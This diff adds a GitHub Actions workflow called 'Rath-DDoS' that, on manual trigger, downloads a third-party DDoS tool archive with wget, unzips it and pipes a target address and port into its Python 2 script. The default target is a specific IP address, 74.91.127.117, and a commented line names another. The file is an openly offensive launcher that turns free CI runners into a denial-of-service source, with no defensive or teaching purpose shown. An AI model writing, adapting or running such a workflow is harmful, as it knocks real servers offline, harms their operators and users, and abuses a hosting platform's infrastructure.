@@ -1,0 +1,41 @@
+# https://stackoverflow.com/questions/5656892/inserting-text-in-a-user-prompt-when-executing-a-command-from-shell-bash-scrip
+# https://askubuntu.com/questions/338857/automatically-enter-input-in-command-line
+name: Rath-DDoS
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        description: "Website Url"
+        required: true
+        default: "74.91.127.117"
+      port:
+        description: "Port of target Website"
+        required: true
+        default: "80"
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+
+    steps:
+    - name: Install Python2 & Unzipper
+      run: |
+       sudo apt update
+       sudo apt install python2
+       sudo apt-get install unzip -y
+    - name: Cloning Rath-DDoS
+      run: wget -O rath-ddos.zip https://github.com/kinghacker0/Rath-DDoS/archive/refs/heads/master.zip
+    - name: Unzip Zip
+      run: unzip rath-ddos.zip
+    - name: Directory
+      run: |
+       cd Rath-DDoS-master
+    - name: Running Script
+      timeout-minutes: 5
+      run: |
+       cd Rath-DDoS-master
+       printf "${{ github.event.inputs.url }}\n${{ github.event.inputs.port }}\n" | python2 rath.py
+#       printf "1.1.1.1\n80\n" | python2 rath.py
+#       printf "${{ github.event.inputs.url }}"
+#       echo "${{ github.event.inputs.port }}"
